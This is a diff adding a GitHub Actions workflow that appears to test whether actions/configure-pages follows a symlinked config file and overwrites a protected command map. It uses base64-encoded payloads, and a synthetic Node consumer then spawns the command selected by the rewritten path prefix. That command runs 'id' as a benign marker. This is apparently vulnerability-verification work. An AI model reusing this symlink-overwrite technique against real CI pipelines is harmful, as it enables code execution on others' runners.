@@ -1,0 +1,79 @@
+name: configure-pages-independent-consumer
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout exact lower data commit
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with:
+          repository: test8177/configure-pages-review-78b118ddb136
+          ref: 24ec468108cccde05af567ca46f952fbf1bde1f1
+          path: lower-data
+          persist-credentials: false
+          set-safe-directory: false
+      - name: Prepare owner synthetic command map and benign id tool
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf %s 'bW9kdWxlLmV4cG9ydHMgPSB7cGF0aFByZWZpeDogJy9zYWZlLWNvbnRyb2wnLGNvbW1hbmRCeVByZWZpeDogeyIvY29uZmlndXJlLXBhZ2VzLXJldmlldy03OGIxMThkZGIxMzYvIjogIi9ob21lL3J1bm5lci93b3JrL190ZW1wL2NvbmZpZ3VyZS1wYWdlcy1iZW5pZ24tdG9vbC03OGIxMThkZGIxMzYiLCcvc2FmZS1jb250cm9sJzogJy9iaW4vZmFsc2UnfSxzZW50aW5lbDogJ293bmVyLXByb3RlY3RlZCd9Cg==' | base64 -d > '/home/runner/work/_temp/configure-pages-command-map-78b118ddb136.js'
+          printf %s 'IyEvYmluL2Jhc2gKc2V0IC1ldW8gcGlwZWZhaWwKaWQgPiAvaG9tZS9ydW5uZXIvd29yay9fdGVtcC9jb25maWd1cmUtcGFnZXMtYmVuaWduLWlkLTc4YjExOGRkYjEzNgo=' | base64 -d > '/home/runner/work/_temp/configure-pages-benign-tool-78b118ddb136'
+          chmod 700 '/home/runner/work/_temp/configure-pages-benign-tool-78b118ddb136'
+          printf %s 'bW9kdWxlLmV4cG9ydHMgPSB7c2VudGluZWw6ICdvcmRpbmFyeS1jb250cm9sJ30K' | base64 -d > "$GITHUB_WORKSPACE/lower-data/regular.js"
+          rm -f '/home/runner/work/_temp/configure-pages-benign-id-78b118ddb136'
+          python3 - <<'PY'
+          import hashlib,json,os
+          h=lambda p:hashlib.sha256(open(p,'rb').read()).hexdigest()
+          v={'protected_sha256':h('/home/runner/work/_temp/configure-pages-command-map-78b118ddb136.js'),'regular_sha256':h(os.environ['GITHUB_WORKSPACE']+'/lower-data/regular.js'),'candidate_is_symlink':os.path.islink(os.environ['GITHUB_WORKSPACE']+'/lower-data/candidate.js'),'candidate_realpath_sha256':hashlib.sha256(os.path.realpath(os.environ['GITHUB_WORKSPACE']+'/lower-data/candidate.js').encode()).hexdigest(),'expected_realpath_sha256':hashlib.sha256('/home/runner/work/_temp/configure-pages-command-map-78b118ddb136.js'.encode()).hexdigest(),'id_exists':os.path.exists('/home/runner/work/_temp/configure-pages-benign-id-78b118ddb136')}
+          open(os.environ['RUNNER_TEMP']+'/configure-pages-review-pre.json','w').write(json.dumps(v,sort_keys=True,separators=(',',':')))
+          PY
+      - name: Strong ordinary no-link control
+        uses: actions/configure-pages@45bfe0192ca1faeb007ade9deae92b16b8254a0d
+        with:
+          static_site_generator: gatsby
+          generator_config_file: lower-data/regular.js
+          token: ${{ github.token }}
+      - name: Verify ordinary control did not mutate protected target
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import hashlib,json,os
+          h=lambda p:hashlib.sha256(open(p,'rb').read()).hexdigest()
+          pre=json.load(open(os.environ['RUNNER_TEMP']+'/configure-pages-review-pre.json'))
+          v={'protected_unchanged':h('/home/runner/work/_temp/configure-pages-command-map-78b118ddb136.js')==pre['protected_sha256'],'regular_changed':h(os.environ['GITHUB_WORKSPACE']+'/lower-data/regular.js')!=pre['regular_sha256'],'id_absent':not os.path.exists('/home/runner/work/_temp/configure-pages-benign-id-78b118ddb136')}
+          open(os.environ['RUNNER_TEMP']+'/configure-pages-review-control.json','w').write(json.dumps(v,sort_keys=True,separators=(',',':')))
+          PY
+      - name: Candidate lower data-only symlink
+        uses: actions/configure-pages@45bfe0192ca1faeb007ade9deae92b16b8254a0d
+        with:
+          static_site_generator: gatsby
+          generator_config_file: lower-data/candidate.js
+          token: ${{ github.token }}
+      - name: Fixed owner synthetic command-map consumer and readback
+        shell: bash
+        run: |
+          set -euo pipefail
+          node <<'NODE'
+          const cp = require('child_process')
+          const value = require('/home/runner/work/_temp/configure-pages-command-map-78b118ddb136.js')
+          const command = value.commandByPrefix[value.pathPrefix]
+          if (typeof command === 'string') cp.spawnSync(command, [], {stdio: 'ignore'})
+          NODE
+          python3 - <<'PY'
+          import hashlib,json,os,re,subprocess
+          h=lambda p:hashlib.sha256(open(p,'rb').read()).hexdigest()
+          pre=json.load(open(os.environ['RUNNER_TEMP']+'/configure-pages-review-pre.json'))
+          control=json.load(open(os.environ['RUNNER_TEMP']+'/configure-pages-review-control.json'))
+          data=open('/home/runner/work/_temp/configure-pages-benign-id-78b118ddb136','rb').read() if os.path.isfile('/home/runner/work/_temp/configure-pages-benign-id-78b118ddb136') else b''
+          loaded=subprocess.run(['node','-e',"const v=require(process.argv[1]); console.log(JSON.stringify({pathPrefix:v.pathPrefix,hasCommandMap:typeof v.commandByPrefix==='object',commandIsExpected:v.commandByPrefix&&v.commandByPrefix[v.pathPrefix]===process.argv[2]}))",'/home/runner/work/_temp/configure-pages-command-map-78b118ddb136.js','/home/runner/work/_temp/configure-pages-benign-tool-78b118ddb136'],capture_output=True,text=True,check=True)
+          value=json.loads(loaded.stdout)
+          candidate=os.environ['GITHUB_WORKSPACE']+'/lower-data/candidate.js'
+          out={'pre_id_absent':not pre['id_exists'],'candidate_is_symlink':os.path.islink(candidate),'candidate_realpath_exact':hashlib.sha256(os.path.realpath(candidate).encode()).hexdigest()==pre['expected_realpath_sha256'],'ordinary_protected_unchanged':control['protected_unchanged'],'ordinary_changed':control['regular_changed'],'ordinary_id_absent':control['id_absent'],'protected_changed_after_candidate':h('/home/runner/work/_temp/configure-pages-command-map-78b118ddb136.js')!=pre['protected_sha256'],'path_prefix_expected':value.get('pathPrefix')=='/configure-pages-review-78b118ddb136/','command_map_preserved':value.get('hasCommandMap') is True,'selected_command_exact':value.get('commandIsExpected') is True,'id_exists':bool(data),'id_bytes':len(data),'id_sha256':hashlib.sha256(data).hexdigest() if data else None,'id_shape':bool(re.search(rb'uid=[0-9]+\([^)]*\).*gid=[0-9]+\([^)]*\)',data)),'real_framework_consumer_used':False,'synthetic_command_map_consumer_used':True}
+          print('CONFIGURE_PAGES_REVIEW_PROJECTION '+json.dumps(out,sort_keys=True,separators=(',',':')))
+          PY
